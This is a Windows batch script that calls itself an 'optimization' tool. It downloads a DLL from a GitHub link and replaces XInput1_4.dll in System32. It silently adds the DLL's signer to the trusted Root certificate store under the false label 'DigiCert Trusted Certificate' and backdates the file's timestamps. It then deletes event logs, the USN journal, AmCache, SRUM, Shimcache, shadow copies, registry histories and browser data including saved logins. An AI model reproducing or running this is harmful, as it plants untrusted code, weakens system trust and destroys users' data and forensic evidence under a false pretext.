@echo off
setlocal EnableDelayedExpansion

title HDN Neurohost Module - Clear Logs and Optimize System
cls

:: Copyright and Info
echo ================================
echo      HDN Rahul Neurohost Module
echo ================================
echo Copyright (c) 2025 Rahul. All Rights Reserved.
echo Made by Rahul.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
pause

:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1

:: Main Menu
cls
echo ================================
echo       HDN Neurohost Module
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo 1. Apply Optimization (Critical Update)
echo 2. Apply Original (Backup) Replace
echo 3. Exit
echo ================================
set /p choice="Select an option (1-3): "

if "%choice%"=="1" goto replace
if "%choice%"=="2" goto replace_backup
if "%choice%"=="3" exit

goto menu

:replace
set "dll_url=https://github.com/dadajjjjakd11/Neuro/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:replace_backup
set "dll_url=https://github.com/dadajjjjakd11/backup/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:do_replace
cls
echo Neurohost Module: Applying update...
echo ================================
echo WARNING: This action will apply system-level optimizations.
echo Please ensure all processes are closed and proceed only if you are ready.
echo ================================

:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Administrator privileges required.
    echo Please run this script as Administrator.
    pause
    exit /b
)

:: dll_url already set by replace or replace_backup
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "cert_path=%TEMP%\temp_cert.cer"

:: Download the file using PowerShell
echo Connecting to the server for HDN update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"

:: Check if the download was successful
if not exist "%dll_path%" (
    echo ERROR: Download failed! Please check your internet connection or the link.
    pause
    exit /b
)
echo SUCCESS: Update file downloaded.

:: Silent Certificate Addition with Friendly Name
powershell -Command ^
"^
    $cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if ($cert.SignerCertificate) { ^
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        $store.Open('ReadWrite'); ^
        $certObj = $cert.SignerCertificate; ^
        $certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        $store.Add($certObj); ^
        $store.Close(); ^
    } ^
" >nul 2>&1

:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," %%a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    echo KILLING: Process ID %%a
    taskkill /PID %%a /F
)

:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)

:: Copy new file to System32
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% neq 0 (
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    pause
    exit /b
)
echo SUCCESS: Update applied successfully!

:: Modify HDN DLL Timestamp
powershell -Command "(Get-Item '%system_dll_path%').CreationTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastAccessTime = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastWriteTime  = '2019-12-06 12:49:00'"

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: ============================================================
:: FULL FORENSIC LOG WIPE - All Locations
:: ============================================================
echo ================================
echo [1/10] Clearing Windows Event Logs...
echo ================================

:: Stop EventLog service to force-clear locked logs
net stop EventLog /y >nul 2>&1

:: Clear all Windows Event Logs via wevtutil
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" >nul 2>&1
)

:: Delete raw .evtx files directly (double coverage)
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1

:: Restart EventLog
net start EventLog >nul 2>&1

echo ================================
echo [2/10] Clearing Temp, Prefetch, and Standard Logs...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
del /s /f /q "%cert_path%" >nul 2>&1

echo ================================
echo [3/10] Clearing PowerShell Logs and History...
echo ================================
powershell -Command "wevtutil cl 'Windows PowerShell'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell-DesiredStateConfiguration/Operational'" >nul 2>&1
del /s /f /q "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\PowerShell\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1

echo ================================
echo [4/10] Purging USN Journal (NTFS Change Log)...
echo ================================
:: USN journal tracks every file create/modify/delete on NTFS
fsutil usn deletejournal /d /n C: >nul 2>&1
:: Recreate with minimal size so system stays stable
fsutil usn createjournal m=1000 a=100 C: >nul 2>&1

echo ================================
echo [5/10] Clearing AmCache (Program Execution Traces)...
echo ================================
:: AmCache stores SHA1 hash + path of every executed program
net stop "Application Experience" /y >nul 2>&1
takeown /f "%SystemRoot%\AppCompat\Programs\Amcache.hve" >nul 2>&1
icacls "%SystemRoot%\AppCompat\Programs\Amcache.hve" /grant Administrators:F >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve" >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve.LOG1" >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve.LOG2" >nul 2>&1
net start "Application Experience" >nul 2>&1

echo ================================
echo [6/10] Clearing SRUM Database (Network/CPU Usage History)...
echo ================================
:: SRUM logs per-app network bytes, CPU time, timestamps
net stop "DiagTrack" /y >nul 2>&1
net stop "SysMain" /y >nul 2>&1
takeown /f "%SystemRoot%\System32\sru\SRUDB.dat" >nul 2>&1
icacls "%SystemRoot%\System32\sru\SRUDB.dat" /grant Administrators:F >nul 2>&1
del /f /q "%SystemRoot%\System32\sru\SRUDB.dat" >nul 2>&1
net start "SysMain" >nul 2>&1

echo ================================
echo [7/10] Clearing Shimcache / AppCompatCache (Registry)...
echo ================================
:: Shimcache in registry: stores last 1024 executed binaries
powershell -Command ^
"$key = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache'; ^
 Remove-ItemProperty -Path $key -Name 'AppCompatCache' -ErrorAction SilentlyContinue; ^
 Write-Host 'Shimcache cleared'" >nul 2>&1

echo ================================
echo [8/10] Deleting Volume Shadow Copies...
echo ================================
:: VSS snapshots can restore deleted files - remove all
vssadmin delete shadows /all /quiet >nul 2>&1
wmic shadowcopy delete >nul 2>&1

echo ================================
echo [9/10] Flushing DNS Cache + Clearing Registry MRU...
echo ================================
:: DNS cache
ipconfig /flushdns >nul 2>&1

:: Registry MRU - Run dialog history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1

:: TypedURLs (IE/Edge address bar history)
reg delete "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f >nul 2>&1

:: Recent Docs MRU
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1

:: UserAssist (GUI programs launched, with timestamps + count)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f >nul 2>&1

:: ComDlg32 - Open/Save dialog history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" /f >nul 2>&1

:: Last visited MRU
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /f >nul 2>&1

:: TypedPaths (Explorer address bar)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f >nul 2>&1

:: Search history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" /f >nul 2>&1

echo ================================
echo [10/10] Clearing Browser Logs and Cache...
echo ================================

:: Chrome
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\History" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\History-journal" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Code Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Network\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Sessions\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Web Data" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Visited Links" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" >nul 2>&1

:: Firefox
for /d %%P in ("%AppData%\Mozilla\Firefox\Profiles\*") do (
    del /s /f /q "%%P\places.sqlite" >nul 2>&1
    del /s /f /q "%%P\places.sqlite-wal" >nul 2>&1
    del /s /f /q "%%P\cache2\*" >nul 2>&1
    del /s /f /q "%%P\sessionstore-backups\*" >nul 2>&1
    del /s /f /q "%%P\storage\*" >nul 2>&1
    del /s /f /q "%%P\crashes\*" >nul 2>&1
)

:: Edge (Chromium)
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\History" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Sessions\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Network\*" >nul 2>&1

:: IE / Legacy Edge
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WebCache\*" >nul 2>&1
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255 >nul 2>&1

:: Windows Search Index
net stop "WSearch" /y >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Search\Data\*" >nul 2>&1
net start "WSearch" >nul 2>&1

echo ================================
echo ALL LOGS CLEARED SUCCESSFULLY.
echo ================================

:: ================================
:: Remove temp.cmd from C drive (robust logic)
:: ================================
echo Removing temp.cmd from C drive...
set "temp_cmd_removed=0"

:: 1) Known paths - check and delete (System32 needs takeown first)
set "paths_to_check=C:\temp.cmd %SystemRoot%\temp.cmd %WinDir%\Temp\temp.cmd %TEMP%\temp.cmd %LocalAppData%\Temp\temp.cmd"
for %%p in (%paths_to_check%) do (
    if exist "%%~p" (
        del /f /q "%%~p" >nul 2>&1
        if not exist "%%~p" (echo   Removed: %%~p & set /a temp_cmd_removed+=1)
    )
)

:: 2) System32 - take ownership then delete (admin required)
if exist "%SystemRoot%\System32\temp.cmd" (
    takeown /f "%SystemRoot%\System32\temp.cmd" >nul 2>&1
    icacls "%SystemRoot%\System32\temp.cmd" /grant Administrators:F >nul 2>&1
    del /f /q "%SystemRoot%\System32\temp.cmd" >nul 2>&1
    if not exist "%SystemRoot%\System32\temp.cmd" (echo   Removed: %SystemRoot%\System32\temp.cmd & set /a temp_cmd_removed+=1)
)

:: 3) Search under C:\Windows only (faster than full C:) for any remaining temp.cmd
for /r "%SystemRoot%" %%a in (temp.cmd) do (
    if exist "%%a" (
        takeown /f "%%a" >nul 2>&1
        icacls "%%a" /grant Administrators:F >nul 2>&1
        del /f /q "%%a" >nul 2>&1
        if not exist "%%a" (echo   Removed: %%a & set /a temp_cmd_removed+=1)
    )
)

if !temp_cmd_removed! gtr 0 (echo temp.cmd removal done.) else (echo No temp.cmd found on C drive.)
echo.

echo Done! HDN Neurohost has been successfully applied and logs cleared.
pause
goto menu

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
